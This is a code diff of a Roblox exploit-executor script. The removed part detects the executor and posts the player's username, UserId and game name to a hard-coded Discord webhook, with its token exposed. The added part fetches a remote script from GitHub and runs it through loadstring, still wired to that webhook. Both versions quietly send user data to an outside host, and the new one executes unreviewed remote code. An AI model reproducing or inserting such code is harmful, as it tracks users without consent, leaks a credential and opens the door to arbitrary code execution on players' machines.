@@ -1,24 +1,6 @@
 local plr = game:GetService("Players").LocalPlayer
 local GetName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
 
-local webhookcheck =
-   is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
-   secure_load and "Sentinel" or
-   KRNL_LOADED and "Krnl" or
-   SONA_LOADED and "Sona" or
-   "Kid with shit exploit"
-
-local url =
-   "https://discord.com/api/webhooks/1214579523874717776/rknNrO1JIH7jqyuS3mVYH1qUZ-f13o8OM0PcHu76jBuktuTNcXelyq7Pju1bfGMIbBYT"
-local data = {
-   ["content"] = "Username: " .. plr.Name .. "\nUserId: " .. plr.UserId .. "\ngame: " .. GetName.Name,
- 
-}
-local newdata = game:GetService("HttpService"):JSONEncode(data)
-
-local headers = {
-   ["content-type"] = "application/json"
-}
-request = http_request or request or HttpPost or syn.request
-local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
-request(abcdef)
+getgenv().whscript = GetName.Name         --Change to the name of your script
+getgenv().webhookexecUrl = "https://discord.com/api/webhooks/1214579523874717776/rknNrO1JIH7jqyuS3mVYH1qUZ-f13o8OM0PcHu76jBuktuTNcXelyq7Pju1bfGMIbBYT"  --Put your Webhook Url here
+loadstring(game:HttpGet(("https://raw.githubusercontent.com/venoxw/venoxw/main/webhook_exec2")))()
